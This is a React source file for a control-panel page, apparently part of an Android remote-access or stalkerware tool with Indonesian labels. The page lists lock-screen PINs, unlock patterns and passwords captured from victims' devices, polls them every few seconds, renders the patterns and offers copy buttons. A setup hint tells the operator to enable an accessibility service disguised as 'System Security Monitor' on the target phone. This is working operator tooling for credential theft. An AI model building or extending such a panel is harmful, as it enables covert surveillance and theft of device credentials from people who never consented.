'use client'

import { useState, useCallback } from 'react'
import Sidebar from '@/components/Sidebar'
import { useDevice } from '@/contexts/DeviceContext'
import {
  ShieldAlert, RefreshCw, Trash2, Copy, Check,
  Hash, Grid3x3, KeyRound, HelpCircle, WifiOff,
  Lock, ListFilter,
} from 'lucide-react'
import useSWR from 'swr'

interface PinCapture {
  id: number
  lockType: string
  value: string
  capturedAt: string
}

const TYPE_CONFIG: Record<string, {
  label: string
  textColor: string
  bgColor: string
  borderColor: string
  icon: React.ReactNode
}> = {
  pin: {
    label: 'PIN',
    textColor: 'text-yellow-400',
    bgColor: 'bg-yellow-400/10',
    borderColor: 'border-yellow-400/30',
    icon: <Hash size={13} />,
  },
  pattern: {
    label: 'Pola',
    textColor: 'text-purple-400',
    bgColor: 'bg-purple-400/10',
    borderColor: 'border-purple-400/30',
    icon: <Grid3x3 size={13} />,
  },
  password: {
    label: 'Sandi',
    textColor: 'text-android-blue',
    bgColor: 'bg-android-blue/10',
    borderColor: 'border-android-blue/30',
    icon: <KeyRound size={13} />,
  },
  unknown: {
    label: 'Lainnya',
    textColor: 'text-android-muted',
    bgColor: 'bg-android-muted/10',
    borderColor: 'border-android-border',
    icon: <HelpCircle size={13} />,
  },
}

function PatternDots({ value }: { value: string }) {
  const nodes = value.split(/[,\s\-→]+/).map(Number).filter(n => !isNaN(n) && n >= 1 && n <= 9)
  if (nodes.length === 0) return <span className="font-mono text-android-text text-sm">{value}</span>

  const positions: Record<number, [number, number]> = {
    1: [0, 0], 2: [1, 0], 3: [2, 0],
    4: [0, 1], 5: [1, 1], 6: [2, 1],
    7: [0, 2], 8: [1, 2], 9: [2, 2],
  }
  const size = 60

  return (
    <svg width={size} height={size} viewBox="0 0 60 60" className="shrink-0">
      {nodes.slice(1).map((n, i) => {
        const [x1, y1] = positions[nodes[i]].map(v => 10 + v * 20)
        const [x2, y2] = positions[n].map(v => 10 + v * 20)
        return (
          <line key={i} x1={x1} y1={y1} x2={x2} y2={y2}
            stroke="#c084fc" strokeWidth="2" strokeOpacity="0.5" strokeLinecap="round" />
        )
      })}
      {[1, 2, 3, 4, 5, 6, 7, 8, 9].map(n => {
        const [cx, cy] = positions[n].map(v => 10 + v * 20)
        const isUsed = nodes.includes(n)
        return (
          <circle key={n} cx={cx} cy={cy} r={isUsed ? 5 : 3.5}
            fill={isUsed ? '#c084fc' : '#334155'}
            opacity={isUsed ? 1 : 0.4}
          />
        )
      })}
    </svg>
  )
}

const fetcher = (url: string) => fetch(url).then(r => r.json())

export default function PinLogPage() {
  const { devices, selectedId: deviceId, setSelectedId: setDeviceId, connected } = useDevice()
  const [copied, setCopied] = useState<number | null>(null)
  const [filter, setFilter] = useState<string>('all')

  const { data, isLoading, mutate } = useSWR(
    deviceId ? `/api/device/pinlog?deviceId=${deviceId}&limit=200` : null,
    fetcher,
    {
      refreshInterval: 4000,
      keepPreviousData: true,
      revalidateOnFocus: true,
    }
  )

  const captures: PinCapture[] = data?.captures ?? []

  const handleClear = useCallback(async () => {
    if (!deviceId || !confirm('Hapus semua data PIN/Pola/Sandi?')) return
    await fetch(`/api/device/pinlog?deviceId=${deviceId}`, { method: 'DELETE' })
    mutate({ captures: [] }, { revalidate: false })
  }, [deviceId, mutate])

  const copyValue = (id: number, value: string) => {
    navigator.clipboard.writeText(value)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  const filtered = filter === 'all' ? captures : captures.filter(c => c.lockType === filter)

  const fmt = (iso: string) =>
    new Date(iso).toLocaleString('id-ID', {
      day: '2-digit', month: 'short',
      hour: '2-digit', minute: '2-digit', second: '2-digit',
    })

  const filterTabs: { key: string; label: string; icon: React.ReactNode }[] = [
    { key: 'all',      label: 'Semua',  icon: <ListFilter size={13} /> },
    { key: 'pin',      label: 'PIN',    icon: <Hash size={13} /> },
    { key: 'pattern',  label: 'Pola',   icon: <Grid3x3 size={13} /> },
    { key: 'password', label: 'Sandi',  icon: <KeyRound size={13} /> },
  ]

  return (
    <div className="flex min-h-screen">
      <Sidebar connected={connected} devices={devices} selectedId={deviceId} onSelect={setDeviceId} />

      <main className="flex-1 page-content overflow-y-auto">
        <div className="max-w-2xl mx-auto px-3 md:px-6 py-4 md:py-6">

          <div className="flex items-center justify-between mb-4">
            <div className="flex items-center gap-2.5">
              <div className="p-2 rounded-xl bg-android-red/10">
                <Lock size={18} className="text-android-red" />
              </div>
              <div>
                <h2 className="text-base md:text-lg font-bold text-white leading-tight">PIN / Pola / Sandi</h2>
                <p className="text-[11px] text-android-muted">
                  {captures.length} entri tersimpan · auto-sync 4s
                </p>
              </div>
            </div>
            <div className="flex gap-1.5">
              <button
                onClick={() => mutate()}
                disabled={isLoading}
                className="p-2 bg-android-surface border border-android-border rounded-lg text-android-muted hover:text-white transition-colors disabled:opacity-50"
                title="Refresh"
              >
                <RefreshCw size={14} className={isLoading ? 'animate-spin' : ''} />
              </button>
              <button
                onClick={handleClear}
                className="p-2 bg-android-surface border border-android-red/30 rounded-lg text-android-red hover:bg-android-red/10 transition-colors"
                title="Hapus semua"
              >
                <Trash2 size={14} />
              </button>
            </div>
          </div>

          <div className="flex gap-1.5 mb-4 overflow-x-auto pb-1 scrollbar-none">
            {filterTabs.map(({ key, label, icon }) => {
              const count = key === 'all' ? captures.length : captures.filter(c => c.lockType === key).length
              const active = filter === key
              return (
                <button
                  key={key}
                  onClick={() => setFilter(key)}
                  className={`shrink-0 flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-medium border transition-colors ${
                    active
                      ? 'bg-android-red/10 border-android-red/40 text-android-red'
                      : 'bg-android-surface border-android-border text-android-muted hover:text-white'
                  }`}
                >
                  {icon}
                  <span>{label}</span>
                  <span className={`text-[10px] px-1.5 py-0.5 rounded-full font-semibold ${
                    active ? 'bg-android-red/20 text-android-red' : 'bg-android-border text-android-muted'
                  }`}>
                    {count}
                  </span>
                </button>
              )
            })}
          </div>

          {connected && captures.length === 0 && !isLoading && (
            <div className="mb-4 p-3 bg-android-yellow/10 border border-android-yellow/30 rounded-xl flex items-start gap-2.5 text-xs text-android-yellow">
              <ShieldAlert size={14} className="shrink-0 mt-0.5" />
              <div>
                <p className="font-semibold">System Security Monitor belum aktif</p>
                <p className="text-android-muted mt-0.5">
                  Settings → Aksesibilitas → Aplikasi yang Diunduh → <strong className="text-android-yellow">System Security Monitor</strong> → ON
                </p>
              </div>
            </div>
          )}

          {!connected && (
            <div className="mb-4 p-3 bg-android-surface border border-android-border rounded-xl flex items-center gap-2 text-xs text-android-muted">
              <WifiOff size={13} className="shrink-0" />
              Hubungkan device untuk melihat data PIN/Pola.
            </div>
          )}

          {isLoading && captures.length === 0 ? (
            <div className="text-center py-12 text-android-muted text-sm">Memuat…</div>
          ) : filtered.length === 0 ? (
            <div className="text-center py-12">
              <Lock size={36} className="mx-auto text-android-muted/20 mb-3" />
              <p className="text-android-muted text-sm">
                {filter === 'all' ? 'Belum ada data tangkapan' : `Belum ada tangkapan tipe "${filter}"`}
              </p>
            </div>
          ) : (
            <div className="space-y-2">
              {filtered.map(c => {
                const info = TYPE_CONFIG[c.lockType] ?? TYPE_CONFIG['unknown']
                const isPattern = c.lockType === 'pattern'
                return (
                  <div
                    key={c.id}
                    className="bg-android-surface border border-android-border rounded-xl p-3 md:p-4 hover:border-android-muted/40 transition-colors"
                  >
                    <div className="flex items-center justify-between mb-2.5">
                      <div className={`flex items-center gap-1.5 px-2 py-1 rounded-lg text-[11px] font-bold border ${info.textColor} ${info.bgColor} ${info.borderColor}`}>
                        {info.icon}
                        {info.label}
                      </div>
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] text-android-muted">{fmt(c.capturedAt)}</span>
                        <button
                          onClick={() => copyValue(c.id, c.value)}
                          className={`p-1.5 rounded-lg border transition-colors ${
                            copied === c.id
                              ? 'bg-android-green/10 border-android-green/30 text-android-green'
                              : 'bg-android-bg border-android-border text-android-muted hover:text-white'
                          }`}
                          title="Salin"
                        >
                          {copied === c.id ? <Check size={12} /> : <Copy size={12} />}
                        </button>
                      </div>
                    </div>

                    <div className="flex items-center gap-3">
                      {isPattern && <PatternDots value={c.value} />}
                      <div className="min-w-0 flex-1">
                        {isPattern ? (
                          <p className="font-mono text-xs text-android-muted break-all">{c.value}</p>
                        ) : (
                          <p className="font-mono text-lg md:text-2xl font-bold text-white tracking-widest break-all">
                            {c.value}
                          </p>
                        )}
                      </div>
                    </div>
                  </div>
                )
              })}
            </div>
          )}

          {filtered.length > 0 && (
            <p className="text-center text-[11px] text-android-muted mt-4 pb-2">
              Menampilkan {filtered.length} dari {captures.length} entri
            </p>
          )}

        </div>
      </main>
    </div>
  )
}
